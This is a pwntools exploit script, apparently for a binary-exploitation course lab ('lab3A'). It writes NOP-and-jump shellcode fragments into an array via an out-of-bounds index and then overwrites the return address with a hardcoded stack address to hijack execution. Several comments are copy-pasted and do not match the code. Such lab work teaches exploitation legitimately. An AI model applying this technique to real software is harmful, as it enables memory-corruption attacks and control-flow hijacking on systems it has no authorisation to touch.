from pwn import *
import time

r = gdb.debug("./lab3A", "break *0x08048c3b")
#r = process("./lab3A")
r.recv()

# 30 bytes total
shell_1 = 0x90909090	# 6 bytes, shellcode = 6
shell_2 = 0xe9079090	# 2 bytes for JMP 1
shell_3 = 0x42424242
shell_4 = 0x90909090	# 6 bytes, shellcode = 12
shell_5 = 0x01e99090	# 2 bytes for JMP 2
shell_6 = 0x42424242
shell_7 = 0x90909090	# 6 byte, shellcode  = 18
shell_8 = 0x01e99090	# 2 bytes for JMP 3
shell_9 = 0x42424242
shell_10 = 0x90909090	# 6 bytes, shellcode = 24
shell_11 = 0x01e99090	# 2 bytes for JMP 4
shell_12 = 0x42424242
shell_13 = 0x90909090	# 8 bytes, shellcode = 30 TOTAL
shell_14 = 0x90909090	
ret2shell = 0xffffd17c
num = 109

# use store command
# place memory address into array
# overflow index
r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_1))    # array[1] = AAAA
r.recv()
r.sendline('1')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_2))    # array[2] = BBBB
r.recv()
r.sendline('2')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_3))    # array[3] = CCCC
r.recv()
r.sendline('3')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_4))    # array[4] = DDDD -> 0xffffd188
r.recv()
r.sendline('4')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_5))    # array[4] = EEEE
r.recv()
r.sendline('5')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_6))    # array[4] = EEEE
r.recv()
r.sendline('6')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_7))    # array[4] = EEEE
r.recv()
r.sendline('7')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_8))    # array[4] = EEEE
r.recv()
r.sendline('8')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_9))    # array[4] = EEEE
r.recv()
r.sendline('9')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_10))    # array[4] = EEEE
r.recv()
r.sendline('10')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_11))    # array[4] = EEEE
r.recv()
r.sendline('11')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_12))    # array[4] = EEEE
r.recv()
r.sendline('12')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_13))    # array[4] = EEEE
r.recv()
r.sendline('13')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_14))    # array[4] = EEEE
r.recv()
r.sendline('14')    # Index
r.recv()


# EIP overwrite - ret2shell
r.sendline('store')     # Command
r.recv()
r.sendline(str(ret2shell))    # ret2shell
r.recv()
r.sendline('%d' % num)    # Index
r.recv()
r.sendline("quit")

r.interactive()


